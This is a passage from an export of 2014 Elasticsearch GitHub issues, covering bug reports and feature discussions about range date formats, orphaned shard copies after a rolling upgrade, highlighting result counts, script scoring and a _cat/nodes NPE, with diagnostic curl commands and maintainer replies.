</comment><comment author="dadoonet" created="2014-10-08T12:05:17Z" id="58347322">Merged with 80ca8e5 and c62730c
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Failed to deserialize exception response from stream</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7823</link><project id="" key="" /><description>Using async Java API with lots of concurrent updates leads to this exception, which is not traceable neither on client nor the server (actually, it looks like shard replication issues on server)
</description><key id="43534352">7823</key><summary>Failed to deserialize exception response from stream</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nfx</reporter><labels><label>feedback_needed</label></labels><created>2014-09-22T18:53:46Z</created><updated>2014-10-15T11:02:49Z</updated><resolved>2014-10-15T11:02:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T15:55:40Z" id="57182865">@nfx could you give us a bit more information, or a way of replicating this?
</comment><comment author="nfx" created="2014-10-04T18:07:07Z" id="57913636">I guess it might be related to issue #5152 https://twitter.com/kimchy/status/514409750780735488
</comment><comment author="clintongormley" created="2014-10-15T11:02:49Z" id="59189530">Fixed by #7837 - please reopen if you see the same issue in v1.4
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add API for running all registered warmers</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7822</link><project id="" key="" /><description>Currently there is no way to reload field cache other than running warmers' queries manually. It would be helpful to have a single API request that runs all registered warmers on all shards. The use case is eg. after clearing field cache, or temporarily disabling warmers.
</description><key id="43530604">7822</key><summary>Add API for running all registered warmers</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mdojwa</reporter><labels><label>discuss</label></labels><created>2014-09-22T18:29:35Z</created><updated>2014-11-28T10:51:51Z</updated><resolved>2014-11-28T10:51:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-11-28T10:51:51Z" id="64881241">Hi @mdojwa 

We talked about this in our FixItFriday session today and we feel that, if you're needing to clear the fielddata cache, there is a different problem that needs fixing: ie you should be moving at least some fields to use doc values instead of in-memory fielddata.

Also, if you're clearing caches manually, then it is also easy to run the warmers manually, by just GETting the warmers and executing their contents. This could be scripted very easily.

Given that there is a simple work around, and it is an uncommon use case, we've decided against adding the feature.

thanks for opening
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add `format` support for date range filter and queries</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7821</link><project id="" key="" /><description>When the date format is defined in mapping, you can not use another format when querying using range date query or filter.

For example, this won't work:

```
DELETE /test

PUT /test/t/1
{
  "date": "2014-01-01"
}

GET /test/_search
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": "01/01/2014"
          }
        }
      }
    }
  }
}
```

It causes:

```
Caused by: org.elasticsearch.ElasticsearchParseException: failed to parse date field [01/01/2014], tried both date format [dateOptionalTime], and timestamp number
```

It could be nice if we can support at query time another date format just like we support `analyzer` at search time on String fields.

Something like:

```
GET /test/_search
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": "01/01/2014",
            "format": "dd/MM/yyyy"
          }
        }
      }
    }
  }
}
```

Same for queries:

```
GET /test/_search
{
  "query": {
    "range": {
      "date": {
        "from": "01/01/2014",
        "format": "dd/MM/yyyy"
      }
    }
  }
}
```

Closes #7189.
</description><key id="43522790">7821</key><summary>Add `format` support for date range filter and queries</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dadoonet</reporter><labels><label>:Query DSL</label><label>feature</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-22T17:41:09Z</created><updated>2015-06-06T18:53:37Z</updated><resolved>2014-10-06T14:30:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-10-06T07:22:22Z" id="57982013">Left some minor comments but it looks good overall
</comment><comment author="jpountz" created="2014-10-06T13:48:58Z" id="58018945">LGTM
</comment><comment author="mattweber" created="2014-10-10T16:36:51Z" id="58681212">Sweet!  Thanks @dadoonet!  I just needed this feature, glad to see it will be in 1.5!   If you can sneak it into 1.4 that would be even better.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Extra copy of index kept after upgrade</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7820</link><project id="" key="" /><description>I upgraded 4-node cluster from 1.0.1 to 1.3.2 today and added fifth node. All without disabling allocation, if that matters. After getting fifth node in sync (1.1Tb of data on disk) other nodes did not remove extra copies of data.

Old nodes now keep 1.4Tb of data and new node keeps 1.1Tb.

This is how cluster looks like:

```
# curl -s http://web245:9200/_cat/nodes?v
host   ip            heap.percent ram.percent load node.role master name
web190 192.168.0.190           61          83 0.00 d         m      statistics01
web592 192.168.2.82            71          83 0.32 d         *      statistics02
web245 192.168.0.245           67          81 0.09 d         m      statistics03
web599 192.168.2.88            72          71 0.03 d         m      statistics05
web467 192.168.1.212           34          34 0.87 d         m      statistics04
```

This is how one of problematic indices looks like:

```
web245 ~ # curl -s http://web245:9200/_cat/indices/statistics-20131224?v
health index               pri rep docs.count docs.deleted store.size pri.store.size
green  statistics-20131224   1   1   65936782            0     14.3gb          7.1gb
```

```
# curl -s http://web245:9200/_cat/segments/statistics-20131224?v
index               shard prirep ip            segment generation docs.count docs.deleted     size size.memory committed searchable version compound
statistics-20131224 0     r      192.168.2.88  _8z9         11637   11929743            0    1.3gb     3927560 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _12cy        49714   28962258            0    3.1gb     7287984 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _156s        53380    2341127            0  260.1mb      505544 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1988        58616    1968309            0  214.1mb      431872 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1c0q        62234    5057415            0  568.2mb     1087232 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1fph        67013    1524853            0  167.7mb      347360 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1j25        71357    4084535            0  453.1mb      822248 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1orl        78753    5784492            0  642.4mb     1426992 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1rnd        82489     671899            0   75.7mb      189648 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1tjx        84957      79005            0    8.7mb       45848 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1u29        85617      40704            0    4.8mb       40296 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1u48        85688      55771            0    6.4mb       42128 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1u9i        85878      51862            0    6.2mb       41776 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1ub6        85938      35209            0    4.2mb       36264 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1ubz        85967      23939            0    2.8mb       33016 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1uc8        85976    3248493            0  367.3mb      666376 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1ud3        86007       6324            0  761.4kb       24264 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1udp        86029       9761            0      1mb       23760 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1ue3        86043       7035            0  768.3kb       22848 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1uea        86050       8030            0  930.9kb       23472 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1ueh        86057       8993            0 1021.1kb       23128 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1uex        86073       6096            0  693.1kb       21704 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1uf5        86081       7484            0    815kb       21888 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1ufd        86089      10304            0    1.1mb       25840 true      true       4.4     false
statistics-20131224 0     r      192.168.2.88  _1ufi        86094      13141            0    1.5mb       27400 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _8z9         11637   11929743            0    1.3gb     3927560 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _12cy        49714   28962258            0    3.1gb     7287984 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _156s        53380    2341127            0  260.1mb      505544 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1988        58616    1968309            0  214.1mb      431872 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1c0q        62234    5057415            0  568.2mb     1087232 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1fph        67013    1524853            0  167.7mb      347360 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1j25        71357    4084535            0  453.1mb      822248 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1orl        78753    5784492            0  642.4mb     1426992 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1rnd        82489     671899            0   75.7mb      189648 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1tjx        84957      79005            0    8.7mb       45848 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1u29        85617      40704            0    4.8mb       40296 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1u48        85688      55771            0    6.4mb       42128 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1u9i        85878      51862            0    6.2mb       41776 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1ub6        85938      35209            0    4.2mb       36264 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1ubz        85967      23939            0    2.8mb       33016 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1uc8        85976    3248493            0  367.3mb      666376 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1ud3        86007       6324            0  761.4kb       24264 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1udp        86029       9761            0      1mb       23760 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1ue3        86043       7035            0  768.3kb       22848 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1uea        86050       8030            0  930.9kb       23472 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1ueh        86057       8993            0 1021.1kb       23128 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1uex        86073       6096            0  693.1kb       21704 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1uf5        86081       7484            0    815kb       21888 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1ufd        86089      10304            0    1.1mb       25840 true      true       4.4     false
statistics-20131224 0     p      192.168.0.245 _1ufi        86094      13141            0    1.5mb       27400 true      true       4.4     false
```

Notice that only `web245` and `web599` should have copies of this index.

And this is how it looks on filesystem:

```
# for i in web190 web245 web467 web592 web599; do echo $i $(ssh root@$i -- du -ms /var/lib/elasticsearch/statistics/nodes/*/indices/statistics-20131224 2&gt;/dev/null); done
web190 1 /var/lib/elasticsearch/statistics/nodes/0/indices/statistics-20131224
web245 7370 /var/lib/elasticsearch/statistics/nodes/0/indices/statistics-20131224
web467 7370 /var/lib/elasticsearch/statistics/nodes/0/indices/statistics-20131224
web592 1 /var/lib/elasticsearch/statistics/nodes/0/indices/statistics-20131224
web599 7370 /var/lib/elasticsearch/statistics/nodes/0/indices/statistics-20131224
```

Extra copy is on web467.

I restarted the node that kept extra copy of index, waited for green cluster and finished relocations, but that didn't help, extra copies are still there.

```
# curl http://web245:9200/_cat/health?v
epoch      timestamp cluster    status node.total node.data shards  pri relo init unassign
1411398730 19:12:10  statistics green           5         5   3090 1545    0    0        0
```

How can this be resolved? Is this a bug or some weird intended behavior?
</description><key id="43500149">7820</key><summary>Extra copy of index kept after upgrade</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bobrik</reporter><labels /><created>2014-09-22T15:14:55Z</created><updated>2014-09-29T11:58:34Z</updated><resolved>2014-09-29T11:34:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-09-25T07:48:09Z" id="56785295">Could this be caused by #7386?
</comment><comment author="bobrik" created="2014-09-25T08:28:27Z" id="56788722">My cluster is 1.3.2 only (btw `/_cat/nodes` is painfully slow):

```
# time curl -s http://web245:9200/_cat/nodes?h=host,load,version
web190 0.14 1.3.2
web592 0.32 1.3.2
web245 0.15 1.3.2
web599 0.34 1.3.2
web467 0.41 1.3.2

real    0m1.433s
user    0m0.000s
sys 0m0.000s
```
</comment><comment author="bobrik" created="2014-09-28T13:36:36Z" id="57085696">I am going purge data dir for each node (one at a time) with hope to fix that issue.
</comment><comment author="bobrik" created="2014-09-29T08:28:37Z" id="57130482">Huh, weird stuff keeps coming up. After stopping one node (`web467`), removal of all its data and starting it again cluster decided to move data to healthy node (`web245`). And mostly to only one from four. I had to disable replica allocation to prevent disk filling.

Now primaries are moving to `web467`, but `web245` doesn't seem to release disk space.

I am worried that I am trapped in some weird state when allocations do anything to fill my disks.

Any idea what should I do?
</comment><comment author="bobrik" created="2014-09-29T08:56:55Z" id="57133261">Here we see that `web245` contains shard 4 for my index `statistics-20140304`:

```
web476 ~ # for i in web190 web245 web467 web592 web599; do echo $i $(ssh root@$i -- du -ms /var/lib/elasticsearch/statistics/nodes/*/indices/statistics-20140304/4 2&gt;/dev/null); done
web190 947 /var/lib/elasticsearch/statistics/nodes/0/indices/statistics-20140304/4
web245 947 /var/lib/elasticsearch/statistics/nodes/0/indices/statistics-20140304/4
web467 947 /var/lib/elasticsearch/statistics/nodes/0/indices/statistics-20140304/4
web592
web599
```

And here we see that it shouldn't:

```
web245 ~ # curl -s http://web245:9200/_cat/segments/statistics-20140304 | awk '$2 == 4 { print $0 }'
statistics-20140304 4 r 192.168.0.190 _hv7 23155 6924047 0 716.2mb 2053168 true true 4.6 false
statistics-20140304 4 r 192.168.0.190 _ikb 24059 2182251 0 229.8mb  469416 true true 4.9 false
statistics-20140304 4 p 192.168.1.212 _hv7 23155 6924047 0 716.2mb 2053168 true true 4.6 false
statistics-20140304 4 p 192.168.1.212 _ikb 24059 2182251 0 229.8mb  469416 true true 4.9 false
```

This is wrong and it happens in latest version of elasticsearch. @kimchy, @dadoonet, any thoughts?
</comment><comment author="bleskes" created="2014-09-29T09:05:47Z" id="57134206">@bobrik following up on @imotov question - when you upgraded the cluster did you do a full cluster restart or a rolling upgrade? (rolling upgrade should be OK, but we had this issue @imotov referred to).
</comment><comment author="bobrik" created="2014-09-29T09:07:33Z" id="57134378">@bleskes rolling upgrade, one node at a time. But the last node restart was with 1.3.2 on each node and still caused orphaned files on filesystem.
</comment><comment author="bleskes" created="2014-09-29T09:10:48Z" id="57134691">@bobrik sadly only a full cluster shut down will fix this. The bug is caused by the in-memory representation of the cluster state and the nodes keep handing it over to each other during a rolling upgrade. We are planning to relase 1.3.3 with a fix for this very soon. If possible I'd suggest you just delete the unneeded files and upgrade once it's out. Will this work for you?
</comment><comment author="bobrik" created="2014-09-29T09:14:41Z" id="57135099">@bleskes any ETA for 1.3.3? I have 80gb left on the worst node and each day can consume around 10gb. If 1.3.3 is coming in a couple of days, I'll wait.
</comment><comment author="bobrik" created="2014-09-29T11:34:46Z" id="57148287">I decided to do full cluster restart and it did the trick!
</comment><comment author="bleskes" created="2014-09-29T11:58:34Z" id="57150346">Cheers @bobrik . Thx for reporting it. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Script with `_score`: remove dependency of DocLookup and scorer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7819</link><project id="" key="" /><description>As pointed out in #7487 DocLookup is a variable that is accessible by all scripts
for one doc while the query is executed. But the _score and therfore the scorer
depends on the current context, that is, which part of query is currently executed.
Instead of setting the scorer for DocLookup
and have Script access the DocLookup for getting the score, the Scorer should just
be explicitely set for each script.
DocLookup should not have any reference to a scorer.
This was similarly discussed in #7043.

This dependency caused a stackoverflow when running script score in combination with an
aggregation on _score. Also the wrong scorer was called when nesting several script scores.

closes #7487
</description><key id="43485046">7819</key><summary>Script with `_score`: remove dependency of DocLookup and scorer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Scripting</label><label>breaking</label><label>bug</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-22T13:43:14Z</created><updated>2015-06-06T17:31:15Z</updated><resolved>2014-09-26T08:00:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-22T13:50:33Z" id="56375269">Just to keep a link of it, adding a comment that this change could help fixing:
- https://github.com/elasticsearch/elasticsearch-lang-javascript/issues/23
- https://github.com/elasticsearch/elasticsearch-lang-python/issues/16
</comment><comment author="brwe" created="2014-09-22T15:04:38Z" id="56386770">@colings86 @dadoonet  I am wondering what to do with 1.3. It is not really broken there, just inconvenient: To use `_score` in aggregations and sorting, one has to use `doc.score` but when we use it in a script score it must be accessed with `_score`. Can we just leave it this way for 1.3.x? Wondering because of https://github.com/elasticsearch/elasticsearch/issues/7712 and https://github.com/elasticsearch/elasticsearch/issues/7752
</comment><comment author="s1monw" created="2014-09-25T19:58:18Z" id="56874603">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Document the Java BulkProcessor</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7818</link><project id="" key="" /><description>Closes #7638.
</description><key id="43479517">7818</key><summary>Document the Java BulkProcessor</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels /><created>2014-09-22T13:06:15Z</created><updated>2014-09-22T13:36:06Z</updated><resolved>2014-09-22T13:35:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-22T13:35:22Z" id="56373119">merged in master and 1.x with f0dc8a8ffb479792df0665ff994a9ba568cbfdb0 and 8a03b5172a34db94ab9e5d4dda929f7a88f681cb
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>search + highlight + sorting -&gt; missing results</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7817</link><project id="" key="" /><description>Hi!

I'm experiencing a weird issue with highlighting. 

When I execute search with highlighting on, I'm getting different number of results based on which sort I choose.

If I run this command (no highlighting, size 500), I'm always getting 500:

```
curl -XGET 'http://localhost:9200/_all/_search?pretty' -d '{
  "query": {     
    "filtered": {
      "query": {
        "bool": {
          "should": [
            {
              "query_string": {
                "query": "*",
                "fields": [
                  "text"
                ]
              }
            }
          ]
        }
      },
      "filter": {
        "bool": {
          "must": [
            {
              "match_all": {}
            }
          ]
        }
      }
    }
  },
  "size": 500,
  "sort": [
    {
      "@timestamp": {
        "order": "asc",
        "ignore_unmapped": true
      }
    }
  ]
}' | grep '_source' | wc -l
```

But, if I run this command (highlighting, size 500), I'm always getting &lt;500 (always the same, 421 for my data):

```
curl -XGET 'http://localhost:9200/_all/_search?pretty' -d '{
  "query": {     
    "filtered": {
      "query": {
        "bool": {
          "should": [
            {
              "query_string": {
                "query": "*",
                "fields": [
                  "text"
                ]
              }
            }
          ]
        }
      },
      "filter": {
        "bool": {
          "must": [
            {
              "match_all": {}
            }
          ]
        }
      }
    }
  },
  "highlight": {
    "fields": {
      "text": {}
    },
    "fragment_size": 100,
    "pre_tags": [
      "@start-highlight@"
    ],
    "post_tags": [
      "@end-highlight@"
    ]
  },
  "size": 500,
  "sort": [
    {
      "@timestamp": {
        "order": "asc",
        "ignore_unmapped": true
      }
    }
  ]
}' | grep '_source' | wc -l
```

If I choose some other sort (desc, or other column), I'll get different number. Of course, there are cases when I get 500.

You can see that those queries were generated by Kibana, but I'm running those directly on ES - so it's not a problem in Kibana. I read documentation and couldn't conclude that this query is invalid - sorry if it is, and it's Kibana bug.
</description><key id="43476890">7817</key><summary>search + highlight + sorting -&gt; missing results</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">mfolnovic</reporter><labels><label>discuss</label><label>feedback_needed</label></labels><created>2014-09-22T12:47:46Z</created><updated>2014-11-08T16:14:57Z</updated><resolved>2014-11-08T16:14:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T15:50:52Z" id="57182127">Hi @mfolnovic 

This is weird... could you gist the actual output that you get from the "broken" query?

Also, could you try reducing the `highlight` section to see if there is a particular parameter which causes the problem, eg remove the `pre_/post_tags`, remove the `fragment_size` etc.
</comment><comment author="clintongormley" created="2014-10-14T13:57:18Z" id="59048161">Hi @mfolnovic 

Any more info here?
</comment><comment author="mfolnovic" created="2014-10-15T15:55:37Z" id="59228855">Hi!

Sorry for the delay. I can't gist the actual output because of confidentiality of data, but I'll try to add mock data and see what happens.

Well, this was weeks ago, but if I recall correctly, I've tried to reduce `highlight` section and didn't work until I totally removed it.
</comment><comment author="clintongormley" created="2014-10-29T14:16:53Z" id="60930792">Hi @mfolnovic 

Any chance of a recreation?
</comment><comment author="clintongormley" created="2014-11-08T16:14:57Z" id="62263315">No response received, closing this ticket for now. Please can you reopen if you manage to come up with a recreation.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Corner case] Script working event after disabling dynamic scripting </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7816</link><project id="" key="" /><description>On executing

```
{
  "size": 0,
  "aggs": {
    "sum": {
      "sum": {
        "script": "doc.score"
      }
    }
  }
}
```

I am seeing 
{
took: 13
timed_out: false
_shards: {
total: 1
successful: 1
failed: 0
}
hits: {
total: 1946
max_score: 0
hits: [ ]
}
aggregations: {
sum: {
value: 1946
}
}
}

But on executing 

```
{
  "size": 0,
  "aggs": {
    "sum": {
      "sum": {
        "script": "_score"
      }
    }
  }
}
```

I am getting - SearchPhaseExecutionException[Failed to execute phase [query_fetch], all shards failed; shardFailures {[OtHPQX2iRj2yhtfeBMqJgA][restaurants][0]: SearchParseException[[restaurants][0]: from[-1],size[0]: Parse Failure [Failed to parse source [{"size":0,"aggs":{"sum":{"sum":{"script":"_score"}}}}]]]; nested: ScriptException[dynamic scripting for [mvel] disabled]; }]
</description><key id="43471379">7816</key><summary>[Corner case] Script working event after disabling dynamic scripting </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">Vineeth-Mohan</reporter><labels><label>bug</label></labels><created>2014-09-22T12:00:56Z</created><updated>2014-10-16T18:03:50Z</updated><resolved>2014-10-16T18:03:50Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T15:44:11Z" id="57181036">Hi @Vineeth-Mohan 

I'm unable to replicate this on 1.3.2.  Could you provide a complete standalone replication?

thanks
</comment><comment author="Vineeth-Mohan" created="2014-09-30T04:41:55Z" id="57266425">@clintongormley  - My apologies  , it was not _size , it was doc.score. 
My concern was that , with scripting disabled , doc.score is working , but _score is giving "scripting disabled error".
</comment><comment author="clintongormley" created="2014-10-14T12:04:14Z" id="59031886">True, in 1.3.3, with scripting disabled:

This works:

```
"doc.score"
```

While this returns an error about disabled scripting:

```
"doc.score+1"
```

@brwe any ideas here?
</comment><comment author="brwe" created="2014-10-15T14:19:10Z" id="59212083">`doc.score` is pre compiled always for optimization: https://github.com/elasticsearch/elasticsearch/blob/1.3/src/main/java/org/elasticsearch/script/ScriptService.java#L250 so the dynamic script check is not performed.
This is already removed in &gt;=1.4, see https://github.com/elasticsearch/elasticsearch/pull/7819
It is confusing but I am unsure if it makes sense to remove it. I can do it if you think so.
</comment><comment author="clintongormley" created="2014-10-16T18:03:50Z" id="59403684">@brwe no, it's not a security issue. i'd leave it as it is, esp as it is already fixed in 1.4.

thanks for looking
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Stats: Fix NPE in /_cat/nodes</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7815</link><project id="" key="" /><description>Query Cache and Suggest stats were introduced in v1.4.0_beta1 and 1.2.0 respectively, therefore they can be null if stats are received from older nodes in the cluster.

Fixes #6297

This problem can occur only 1.x since current master isn't backward compatible with previous versions of elasticsearch anyway. So, I am opening this PR against 1.x not master. Not sure if this is right thing to do.
</description><key id="43461623">7815</key><summary>Stats: Fix NPE in /_cat/nodes</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">imotov</reporter><labels><label>:CAT API</label><label>bug</label><label>v1.4.0.Beta1</label><label>v1.5.0</label></labels><created>2014-09-22T10:48:04Z</created><updated>2015-03-19T17:40:18Z</updated><resolved>2014-09-23T11:15:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-22T11:08:08Z" id="56358458">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add `min_score` parameter to function score query to only match docs above this threshold</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7814</link><project id="" key="" /><description>...old

functon_score matched each document regardless of the computed score.
This commit adds a query parameter `min_score` (-Float.MAX_VALUE default).
Documents that have a score lower than this threshold will not be mached.

closes #6952
</description><key id="43430536">7814</key><summary>Add `min_score` parameter to function score query to only match docs above this threshold</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels><label>:Query DSL</label><label>feature</label><label>release highlight</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-22T07:43:36Z</created><updated>2015-03-19T09:43:38Z</updated><resolved>2014-11-28T11:38:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-10-07T12:04:56Z" id="58173882">I don't think we 